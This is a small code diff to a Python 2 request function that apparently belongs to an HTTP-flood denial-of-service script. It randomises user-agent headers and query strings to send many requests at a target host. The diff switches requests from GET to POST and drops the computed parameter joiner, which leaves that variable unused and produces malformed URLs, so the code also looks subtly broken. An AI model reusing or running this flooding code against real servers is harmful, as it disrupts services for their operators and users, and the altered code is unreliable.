@@ -85,10 +85,10 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib2.Request(url + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Host',host)
-	request.get_method = lambda: "GET"
+	request.get_method = lambda: "POST"
 	try:
 			urllib2.urlopen(request)
 	except socket.error as e:
